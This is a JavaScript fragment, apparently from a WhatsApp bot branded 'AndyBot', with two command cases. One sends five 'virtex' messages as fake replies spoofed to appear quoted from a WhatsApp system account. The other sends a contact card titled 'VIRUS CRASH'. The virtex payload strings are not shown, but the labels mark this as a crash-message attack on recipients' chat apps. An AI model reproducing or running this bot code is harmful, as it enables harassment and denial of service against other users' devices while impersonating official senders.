...
conn.fakeReply(from, virtex1, '0@s.whatsapp.net', '🔥 *By 𝐀𝐧𝐝𝐲𝐁𝐨𝐭 𝐩𝐨𝐫 𝐀𝐧𝐝𝐲𝐦𝐫𝐥𝐢𝐭* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex2, '0@s.whatsapp.net', '🔥 *By 𝐀𝐧𝐝𝐲𝐁𝐨𝐭 𝐩𝐨𝐫 𝐀𝐧𝐝𝐲𝐦𝐫𝐥𝐢𝐭* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex3, '0@s.whatsapp.net', '🔥 *By 𝐀𝐧𝐝𝐲𝐁𝐨𝐭 𝐩𝐨𝐫 𝐀𝐧𝐝𝐲𝐦𝐫𝐥𝐢𝐭* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex4, '0@s.whatsapp.net', '🔥 *By 𝐀𝐧𝐝𝐲𝐁𝐨𝐭 𝐩𝐨𝐫 𝐀𝐧𝐝𝐲𝐦𝐫𝐥𝐢𝐭* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex5, '0@s.whatsapp.net', '🔥 *By 𝐀𝐧𝐝𝐲𝐁𝐨𝐭 𝐩𝐨𝐫 𝐀𝐧𝐝𝐲𝐦𝐫𝐥𝐢𝐭* 🔥', 'status@broadcast')} 
break
...
await conn.sendContact(from, '🔥 VIRUS CRASH BY 𝐀𝐧𝐝𝐲𝐁𝐨𝐭 𝐩𝐨𝐫 𝐀𝐧𝐝𝐲𝐦𝐫𝐥𝐢𝐭 🔥', fkontaak)}
break   
